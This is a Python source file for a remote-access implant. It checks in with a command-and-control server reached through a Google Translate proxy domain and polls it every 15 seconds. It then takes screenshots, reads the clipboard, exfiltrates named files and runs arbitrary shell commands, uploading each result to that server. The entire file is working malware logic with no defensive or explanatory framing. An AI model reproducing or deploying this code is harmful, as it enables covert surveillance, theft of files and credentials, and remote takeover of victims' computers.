from src import upload,screenshot,clipboard,files,command
import requests
import json
import time

HOSTNAME="USER-PC"
IP="192.168.1.1"
BASE_URL = "https://your-domain.translate.goog/"

ack_url=BASE_URL+HOSTNAME+"/"+IP+"/Status/ON/"
get_cmd=BASE_URL+"c/"+HOSTNAME+"/"+IP
requests.get(ack_url)

while True:
    action=json.loads(requests.get(get_cmd).content.decode())["actions"]
    print(get_cmd)
    print("action="+str(json.loads(requests.get(get_cmd).content.decode())))
    args=action.split(" ")
    if args[0]=="screenshot":
        (md5,data)=screenshot.take_screenshot()
        upload.upload_data(BASE_URL,HOSTNAME,IP,"Screenshot",data,md5)
    elif args[0]=="clipboard":
        data=clipboard.get_clipboard()
        upload.upload_data(BASE_URL,HOSTNAME,IP,"Clipboard",data)
    elif args[0]=="download":
        (md5,data,filetype)=files.exfiltrate_file(args[1])
        if data:
            if filetype == "":
                filetype="FILE"
            upload.upload_data(BASE_URL,HOSTNAME,IP,filetype,data,md5)
    elif len(action)>0:
        data=command.execute_cmd(args)
        if data!="":
            upload.upload_data(BASE_URL,HOSTNAME,IP,"Command",data)
    time.sleep(15)